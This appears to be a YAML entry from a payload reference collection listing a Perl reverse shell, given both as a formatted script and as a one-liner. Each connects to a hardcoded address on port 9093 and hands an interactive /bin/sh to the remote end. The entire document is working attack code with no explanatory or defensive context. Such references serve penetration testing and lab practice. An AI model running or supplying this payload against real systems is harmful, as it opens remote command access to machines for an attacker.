---
functions:
  shell:
    - description: Perl reverse shell
      code: |
        use Socket;$i="10.10.10.10";$p=9093;
        socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
        if(connect(S,sockaddr_in($p,inet_aton($i)))){
        	open(STDIN,">&S");
        	open(STDOUT,">&S");
        	open(STDERR,">&S");
        	exec("/bin/sh -i");};

        use Socket;$i="10.10.14.11";$p=9093;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
---
